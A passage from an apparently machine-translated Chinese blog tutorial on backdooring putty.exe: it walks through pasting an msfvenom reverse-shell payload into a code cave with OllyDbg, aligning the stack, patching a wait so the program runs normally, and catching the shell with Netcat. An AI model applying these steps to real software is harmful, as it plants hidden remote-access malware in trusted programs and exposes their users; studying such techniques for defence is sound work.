src="../Images/1988400ae2fc4029abdec5bed327e5f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6tgJcxiwtwKYxgUYnBHvQw.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图37 — [msfvenom]反向外壳负载</figcaption></figure><p id="2666" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">为了添加创建的“msfvenom”有效负载，我们需要在代码cave中突出足够的空间，并将其作为“二进制粘贴”进行粘贴。</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi po"><img src="../Images/c922a7e760c9b8c40835b27947dfc166.png" data-original-src="https://miro.medium.com/v2/resize:fit:1274/format:webp/1*Kj6eD0BD-zZbF9SRyTX8gw.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图38 — [OllyDbg]将“msfvenom”有效负载复制并粘贴到代码洞穴中</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi pp"><img src="../Images/5c0ed0ebc489b20996f2b4516b93eb7a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1060/format:webp/1*U2dCANgeSZz2m3xLoqGSAw.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图39 — [OllyDbg]添加了反向外壳有效负载</figcaption></figure><p id="b99a" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">让我们将文件的当前版本保存为“puttey-02.exe”。现在，我们需要进行堆栈对齐，以使ESP在执行后返回到反向shell shellcode代码的开头。简单来说:</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi pq"><img src="../Images/d19a6f702df20d3304ea042f73fa80f1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1160/format:webp/1*8byblQ8j4GWB0UruGoufGQ.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图40 —堆栈对齐</figcaption></figure><p id="9458" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">外壳代码开头的ESP =<code class="fe ob oc od oe b">0018FF68</code></p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi pr"><img src="../Images/84d327cb44dfe12c09f223db984e6dc3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iBIpWA5bbf5Tw0_J_CDeWA.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图41-外壳代码的开始</figcaption></figure><p id="fe58" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">外壳代码= <code class="fe ob oc od oe b">0018FD64</code>末尾的ESP</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi ps"><img src="../Images/6ba299a24646fdbcc3febc19dcf60394.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BGofjqCkqTkUe-HfMJydZA.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图42 — [OllyDbg]外壳代码结束</figcaption></figure><p id="21ea" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">计算这两(2)个ESP值之间的差值:</p><ul class=""><li id="9fd6" class="mg mh it kx b ky nh lc ni lg nm lk nn lo no ls ml mm mn mo bi translated"><code class="fe ob oc od oe b">0018FF68</code> — <code class="fe ob oc od oe b">0018FD64</code> = 204</li></ul><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi pt"><img src="../Images/d5a6bb754085339dd7e209c8126e31e6.png" data-original-src="https://miro.medium.com/v2/resize:fit:824/format:webp/1*NHalQjPckyWo3vQFaMcUhQ.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图43—[计算]</figcaption></figure><p id="69fc" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">现在，我们需要完成剩余的执行流程。然后将文件的当前版本保存为“putty-03.exe”</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi pu"><img src="../Images/88471dea3367573a333d36af2bac7f5e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ngHmTNENmgF8eP-SLQEXKg.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图44 — [OllyDbg]完成执行流程</figcaption></figure><h2 id="0352" class="np jy it bd jz nq nr dn kd ns nt dp kh lg nu nv kl lk nw nx kp lo ny nz kt oa bi translated">反壳？</h2><p id="f04b" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">让我们看看我们的武器化PE是否如预期的那样工作…</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi pv"><img src="../Images/09ef9a1bacb0a2a64b224380e799d764.png" data-original-src="https://miro.medium.com/v2/resize:fit:1228/format:webp/1*r1A9K7F54N3tCrqhNuAqvQ.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图45 — [putty]我们快到了吗？</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi pw"><img src="../Images/8e1fbbc7e9460c48b88ea094ba40cd72.png" data-original-src="https://miro.medium.com/v2/resize:fit:1326/format:webp/1*jDs1lklMDZljOvi8iC5zPg.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图46 —从“putty-03.exe”反转外壳</figcaption></figure><p id="229b" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">太好了！我们能够从Window 7机器获得到我的Kali Linux的反向shell连接…等等…“putty . exe”没有运行。好吧，这是因为“msfvenom”的<code class="fe ob oc od oe b">WaitForSingleObject</code>功能阻止了下一步的运行，直到当前的反向shell连接退出。换句话说，我们不会看到“putty.exe ”,直到我们杀死我们的反向外壳。</p><h2 id="50e8" class="np jy it bd jz nq nr dn kd ns nt dp kh lg nu nv kl lk nw nx kp lo ny nz kt oa bi translated">反向外壳+Putty.exe</h2><p id="cbc9" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">为了解决这个问题，我们可以在外壳代码中找到<code class="fe ob oc od oe b">dwMilliseconds</code>参数值，并将其从“-1”更改为“0”但是更简单的方法是，我们可以找到最后一个<code class="fe ob oc od oe b">DEC ESI</code>代码，并将其更改为<code class="fe ob oc od oe b">NOP</code>。然后将文件的当前版本保存为“putty-04.exe”</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi px"><img src="../Images/d558a22c57b0ab070bbaa5847b4c5a82.png" data-original-src="https://miro.medium.com/v2/resize:fit:1058/format:webp/1*q2ETMU_MZ2LlF_1yLKBrfg.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图47 — [OllyDbg]查找最后一个“DEC ESI”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi py"><img src="../Images/cffc7d40812bd81d822b86d65c68ae06.png" data-original-src="https://miro.medium.com/v2/resize:fit:1054/format:webp/1*KhHuHWgHlgToi6lTdjyuMg.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图48 — [OllyDbg]将“DEC ESI”更改为“NOP”</figcaption></figure><p id="eee2" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">现在，让我们在Netcat侦听器运行的同时运行我们的“putty-04.exe”。</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi pi"><img src="../Images/4b67190f3bb189343963efc8c65a10ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1288/format:webp/1*qRa-xRXlItiDMXU_hO5r5A.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图49 —从“putty-04.exe”反转外壳</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi pz"><img src="../Images/42025cc749a44e6add075a2cfb083d28.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qS0sT5lcQbJDvBubmCHcOg.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图50 — [putty]如此无缝:)</figcaption></figure><p id="eb2a" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">完美！我们通过对PE进行武器化，成功地将自己的恶意外壳代码注入到一个合法的“putty.exe”文件中。</p><h1 id="9db5" class="jx jy it bd jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">结论</h1><p id="d038" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">这是一篇相当长且截图沉重的博文。我希望提供一步一步的指示，以便人们可以复制它，而不用对他们的结束做太多的研究。这个例子对于今天的现代技术可能有一些限制；然而，这将是学习更多关于利用PE进行开发的一个很好的基础。希望你喜欢看我的帖子，下次我会带来更多有趣的黑客素材。感谢阅读！</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi qa"><img src="../Images/d9e2d5361adc987789dd1adf20f8061e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Nbn9KyMJYjdj0rGBKmKTkA.png"/></div></div></figure></div></div>    
</body>
</html>